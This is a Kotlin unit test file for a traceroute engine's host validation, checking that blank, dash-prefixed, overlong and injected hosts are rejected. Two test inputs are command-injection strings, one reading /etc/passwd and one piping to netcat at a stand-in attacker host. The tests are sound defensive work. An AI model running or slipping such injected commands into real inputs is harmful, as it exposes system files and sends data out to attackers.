package us.beary.netlens.feature.traceroute.engine

import kotlinx.coroutines.flow.first
import kotlinx.coroutines.test.runTest
import org.junit.jupiter.api.Assertions.assertNotNull
import org.junit.jupiter.api.Test
import org.junit.jupiter.api.assertThrows

class TracerImplTest {

    private val tracer = TracerImpl()

    @Test
    fun `blank host throws IllegalArgumentException`() = runTest {
        assertThrows<IllegalArgumentException> {
            tracer.trace("").first()
        }
    }

    @Test
    fun `host starting with dash throws IllegalArgumentException`() = runTest {
        assertThrows<IllegalArgumentException> {
            tracer.trace("-malicious.com").first()
        }
    }

    @Test
    fun `host with shell injection throws IllegalArgumentException`() = runTest {
        assertThrows<IllegalArgumentException> {
            tracer.trace("; cat /etc/passwd").first()
        }
    }

    @Test
    fun `host with pipe throws IllegalArgumentException`() = runTest {
        assertThrows<IllegalArgumentException> {
            tracer.trace("8.8.8.8 | nc attacker.com 4444").first()
        }
    }

    @Test
    fun `host exceeding 253 chars throws IllegalArgumentException`() = runTest {
        val longHost = "a".repeat(254) + ".com"
        assertThrows<IllegalArgumentException> {
            tracer.trace(longHost).first()
        }
    }

    @Test
    fun `valid hostname creates flow without validation error`() {
        val flow = runCatching { tracer.trace("example.com") }
        assertNotNull(flow.getOrNull())
    }

    @Test
    fun `valid IP creates flow without validation error`() {
        val flow = runCatching { tracer.trace("8.8.8.8") }
        assertNotNull(flow.getOrNull())
    }
}
